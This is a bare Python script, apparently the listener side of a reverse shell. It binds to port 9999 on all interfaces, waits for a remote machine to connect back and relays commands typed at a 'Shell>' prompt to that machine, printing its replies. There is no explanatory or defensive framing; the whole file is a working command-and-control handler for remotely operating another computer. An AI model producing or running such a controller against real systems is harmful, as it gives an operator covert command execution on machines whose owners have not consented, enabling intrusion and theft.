import socket

def start_server():
    host = '0.0.0.0'
    port = 9999

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(5)
    print(f"[*] Listening on {host}:{port}")

    while True:
        client_socket, client_address = s.accept()
        print(f"[*] Connection from {client_address}")

        while True:
            command = input("Shell> ")
            if command.lower() == "exit":
                client_socket.send(command.encode())
                client_socket.close()
                break
            else:
                client_socket.send(command.encode())
                response = client_socket.recv(1024)
                print(response.decode('utf-8'))

if __name__ == "__main__":
    start_server()
